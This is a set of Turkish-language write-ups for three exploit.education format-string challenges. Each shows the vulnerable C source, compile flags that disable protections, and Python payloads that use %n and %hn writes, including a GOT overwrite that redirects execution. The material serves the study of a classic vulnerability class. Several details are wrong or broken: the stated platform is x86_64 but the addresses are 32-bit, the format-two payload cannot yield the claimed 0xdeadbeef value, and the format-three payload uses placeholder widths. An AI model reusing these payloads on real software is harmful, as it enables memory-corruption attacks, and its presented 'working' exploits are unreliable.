# Reverse Engineering Write-ups (Exploit Education Series)

---

## 📁 exploit.education_format-one/README.md

```markdown
# Format-One Write-up – Format String Exploitation (Intermediate)

## 🎯 Amaç

changeme değişkeninin değerini 0x45764f6c yapmak.

---

## 🧪 Challenge Bilgileri

- Platform: Linux (x86_64)
- Zafiyet Türü: Format String (%n yazımı)
- Anahtar Değer: 0x45764f6c → ASCII: lOvE → Little-endian: \x6c\x4f\x76\x45

---

## ⚙️ Derleme

```bash
gcc -g -fno-stack-protector -z execstack -no-pie -o format_one format_one.c
```

## 🔍 Kod Analizi

```c
int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];
  printf("Welcome to format_one brought to you by https://exploit.education\n");
  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) errx(1, "Unable to get buffer");
  buffer[15] = 0;
  locals.changeme = 0;
  sprintf(locals.dest, buffer);
  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n", locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }
  exit(0);
}
```

---

## 🧪 Exploit

```bash
python3 -c 'print("%31x " + "\x6c\x4f\x76\x45")' > payload.txt
./format_one < payload.txt
```

---
```

---

## 📁 exploit.education_format-two/README.md

```markdown
# Format-Two Write-up – Precise Memory Overwrite Using %n

## 🎯 Amaç

Format string kullanarak belirli bir bellek adresine kesin değer yazmak. Hedef: changeme = 0xdeadbeef

---

## 🧪 Challenge Bilgileri

- Platform: Linux (x86_64)
- Zafiyet Türü: Format String (arbitrary write via %n)

---

## ⚙️ Derleme

```bash
gcc -g -fno-stack-protector -z execstack -no-pie -o format_two format_two.c
```

## 🔍 Kod Analizi

```c
int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int *changeme;
  } locals;
  char buffer[128];
  printf("Welcome to format_two\n");
  locals.changeme = malloc(sizeof(int));
  *locals.changeme = 0;
  fgets(buffer, sizeof(buffer) - 1, stdin);
  buffer[127] = 0;
  sprintf(locals.dest, buffer);
  if (*locals.changeme == 0xdeadbeef) {
    puts("Success: You changed the changeme variable!");
  } else {
    printf("Fail: changeme is %p\n", (void *) *locals.changeme);
  }
  return 0;
}
```

---

## 🧪 Exploit

```bash
python3 -c 'print("\x80\xa0\x04\x08%34005x%4$n")' > payload.txt
./format_two < payload.txt
```

---
```


## 📁 exploit.education_format-three/README.md

```markdown
# Format-Three Write-up – Stack-Based Format String Exploitation (Advanced)

## 🎯 Amaç

Format string kullanarak `.got` tablosundaki bir fonksiyon adresini overwrite ederek `changeme()` fonksiyonuna yönlendirme.

---

## 🧪 Challenge Bilgileri

- Platform: Linux (x86_64)
- Zafiyet Türü: Format String → GOT Overwrite
- Korumasız Alan: `sprintf(locals.dest, buffer);`

---

## ⚙️ Derleme

```bash
gcc -g -fno-stack-protector -z execstack -no-pie -o format_three format_three.c
```

---

## 🔍 Kod Analizi

```c
void changeme() {
  puts("You have successfully redirected execution!");
  exit(0);
}

int main() {
  char buffer[128];
  printf("Welcome to format_three\n");

  fgets(buffer, sizeof(buffer) - 1, stdin);
  buffer[127] = 0;

  char dest[64];
  sprintf(dest, buffer);

  puts("Try again!");
}
```

---

## 🧪 Exploit Adımları

### 1. GOT tablosundaki hedef adresi bul

```bash
objdump -R format_three | grep puts
```

Örnek çıktı:
```
0804a010 R_386_JUMP_SLOT   puts
```

### 2. `changeme` fonksiyon adresini öğren

```bash
objdump -d format_three | grep changeme
```

---

### 3. Payload Oluşturma

İlk 2 byte ve son 2 byte şeklinde yazım yapılır: `%hn` kullanılarak 2'şer baytlık yazmalar yapılabilir.

```bash
python3 -c 'print("\x10\xa0\x04\x08\x12\xa0\x04\x08" + "%1234x%4$hn" + "%5678x%5$hn")' > payload.txt
./format_three < payload.txt
```

> Adreslerin sırası ve offset doğru belirlenmelidir. `%4$hn`, `%5$hn` gibi formatlar ile belirli sıradaki parametrelere yazılır.

---

## ✅ Beklenen Çıktı

```
You have successfully redirected execution!
```

---

## 📌 Notlar

- GOT overwrite, fonksiyon yönlendirme için sıklıkla kullanılır.
- `%n`, `%hn`, `%lln` gibi formatlar bellek manipülasyonu sağlar.
- Bu tip zafiyetler modern sistemlerde RELRO, PIE, ASLR gibi korumalarla önlenebilir.

---

## 📚 Kaynaklar

- https://exploit.education
- https://owasp.org/www-community/attacks/Format_string_attack
- https://github.com/hugsy/gef
```
